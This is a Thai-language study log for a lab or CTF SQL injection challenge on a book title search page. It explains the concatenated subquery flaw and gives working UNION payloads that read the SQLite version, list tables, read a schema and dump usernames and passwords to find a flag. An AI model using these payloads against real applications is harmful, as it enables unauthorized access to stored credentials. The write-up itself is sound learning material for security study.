# Day 6 — SQL Injection: Book Title Search

---

## สิ่งที่เรียนวันนี้

Day 6 เป็น First-Order SQL Injection เพราะ payload ทำงานทันทีที่ทำการค้นหาข้อมูล book title ไม่ต้องรอ trigger ที่อื่น

สิ่งที่แตกต่างจาก Day ก่อนหน้าคือ query มีโครงสร้างซ้อนกัน 2 ชั้น — query หลักและ subquery โดยมีการใช้งานฟังก์ชัน `LIKE` ค้นหาข้อมูลแบบ pattern ผ่านสัญลักษณ์ `%` (wildcard)

ในการฉีด payload เข้าไปใน challenge นี้จำเป็นต้องปิดการทำงานของ subquery ด้วย `')` แล้วเพิ่ม payload ใน query นอกเพื่อให้สามารถ inject ได้

ช่องโหว่ของ challenge Book Title คือเมนูค้นหาข้อมูลหนังสือในระบบ — subquery ไม่ได้ใช้ parameterized query (ใช้ string concatenation แทน) ส่งผลให้สามารถ inject ที่หน้า Book Title ได้

---

## LIKE Operator คืออะไร

`LIKE` คือการค้นหาแบบ pattern ซึ่งสัญลักษณ์ `%` คือ wildcard ที่หมายถึง "อะไรก็ได้ กี่ตัวก็ได้"

ตัวอย่าง: `title LIKE 'Har%'` → ผลลัพธ์ที่ได้จะเจอ "Harry Potter", "Harrom" และอะไรก็ได้ที่ขึ้นต้นด้วย Har

`=` คือเท่ากัน ตรงกันทั้งหมด เช่น `title = 'Harry Potter'` → ข้อมูลต้องเหมือนกันทุกตัวอักษรถึงจะแสดง

---

## โครงสร้าง Query ที่มีช่องโหว่

```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '" + title + "%')
```

แบ่งการค้นหาออกเป็น 2 ส่วน:

**Query หลัก:** `SELECT * from books WHERE id = (...)` — ค้นหาข้อมูลทั้งหมด (ทุก column) จากตาราง books ที่ id ตรงกับผลลัพธ์ของ subquery

**Subquery:** `SELECT id FROM books WHERE title like '" + title + "%'` — ค้นหา id จาก title ที่ตรงกับเงื่อนไข LIKE ตามข้อมูล input ที่รับ

### ช่องโหว่อยู่ตรงไหน

ช่องโหว่อยู่ที่ **subquery** — ใช้ string concatenation (`'" + title + "`) แทน parameterized query ทำให้สามารถปิด subquery ด้วย `')` แล้วฉีด payload เข้าไปใน query หลักได้

เหตุผลที่ต้องหลุดออกจาก subquery ไปฉีดใน query นอก เพราะ subquery SELECT แค่ `id` column เดียว ซึ่งไม่สะดวกในการแสดงผลข้อมูลที่ต้องการ

---

## ขั้นตอนการ Exploit

### Step 1 — ระบุชนิดของ Database Engine

```sql
') UNION SELECT 3, sqlite_version(), 1, 1 -- -
```

ผลลัพธ์: SQLite version 3.31.1

> `SELECT *` ดึง 4 column จากตาราง books แต่หน้าเว็บแสดงแค่ 3 อย่าง (Title, Description, Author) — column ที่ไม่แสดงคือ id ซึ่งเป็น primary key ดังนั้น UNION SELECT ต้องใส่ 4 column

### Step 2 — Enumerate Tables

```sql
') UNION SELECT 3, (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'), 1, 1 -- -
```

ผลลัพธ์: `users,notes,books`

### Step 3 — ตรวจสอบโครงสร้างของ Table

> ⚠️ ไม่เปิดเผยชื่อ Table จริงที่เกี่ยวข้องกับโจทย์ — ใช้ T1, T2 แทน

```sql
') UNION SELECT 3, (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='T1'), 1, 1 -- -
```

### Step 4 — Dump ข้อมูลภายใน Table

```sql
') UNION SELECT 3, (SELECT group_concat(id || "," || username || "," || password || ":") FROM T1), 1, 1 -- -
```

พบ flag ใน table ที่ dump ออกมา

---

## จุดที่เข้าใจผิดและต้องแก้ไข

### 1. UNION SELECT — ตัวเลขไม่ใช่ขนาด column

**เข้าใจผิด:** คิดว่าตัวเลขที่ใส่ใน UNION SELECT (เช่น `3`) คือการระบุขนาดของ column

**ที่ถูกต้อง:** ตัวเลขเหล่านั้นคือ **ค่า placeholder** ที่ใส่แทนข้อมูลจริงในแต่ละ column — จะใส่เลขอะไรก็ได้ เช่น `1`, `2`, `3` สิ่งสำคัญคือ **จำนวน** column ต้องตรงกับ query หลัก

### 2. Column เว้นว่างไม่ได้

**เข้าใจผิด:** เขียน UNION SELECT แล้วเว้น column ว่าง เช่น `UNION SELECT 3, sqlite_version(), , -- -`

**ที่ถูกต้อง:** ทุก column ใน UNION SELECT ต้องมีค่า — SQL จะ error ถ้ามี column ที่ว่างเปล่า ใส่ค่า placeholder เช่น `1` แทนได้

### 3. ช่องโหว่อยู่ที่ subquery ไม่ใช่ query หลัก

**เข้าใจผิด:** คิดว่า root cause อยู่ที่ query หลักไม่ได้ใช้ parameterized query

**ที่ถูกต้อง:** String concatenation อยู่ใน **subquery** ตรง `title like '" + title + "%'` — ตรงนั้นคือจุดที่ฉีด payload เข้าไป เราปิด subquery ด้วย `')` เพื่อหลุดออกไปฉีดใน query นอก

### 4. ผลลัพธ์ที่แสดงไม่ใช่จำนวน column จริงเสมอไป

**เข้าใจผิด:** เห็นผลลัพธ์แสดง 3 อย่าง (Title, Description, Author) จึงคิดว่ามี 3 column

**ที่ถูกต้อง:** ตาราง books มี 4 column จริงๆ แต่หน้าเว็บไม่แสดง id (primary key) ดังนั้น UNION SELECT ต้องใส่ 4 column ถึงจะไม่ error

---

## Lesson สำคัญที่สุดของวันนี้

- **ผลลัพธ์ที่แสดงบนหน้าเว็บไม่ได้บอกจำนวน column จริงเสมอ** — บาง column อาจไม่แสดงผล เช่น id ที่เป็น primary key ดังนั้นค่า placeholder ที่ต้องใส่ใน UNION SELECT จึงอาจมากกว่าที่เห็นจากผลลัพธ์ หากไม่รู้จำนวน column เลย สามารถใช้เทคนิค `ORDER BY` หาได้ เช่น `ORDER BY 1`, `ORDER BY 2` ไปเรื่อยๆ จนกว่าจะ error

- **LIKE + `%` เป็น pattern matching** — ต่างจาก `=` ที่ต้องตรงเป๊ะ `LIKE` ใช้ wildcard `%` ค้นหาแบบ "ขึ้นต้นด้วย" หรือ "มีคำนี้อยู่" ได้

- **Query ที่มี subquery ซ้อน ต้องปิด subquery ก่อนฉีด** — ใช้ `')` ปิด subquery แล้วเพิ่ม payload ใน query นอก เพราะ subquery SELECT แค่ column เดียวไม่สะดวกในการแสดงผลข้อมูล

---

*Day 6 Complete — ต่อไป: Day 7*
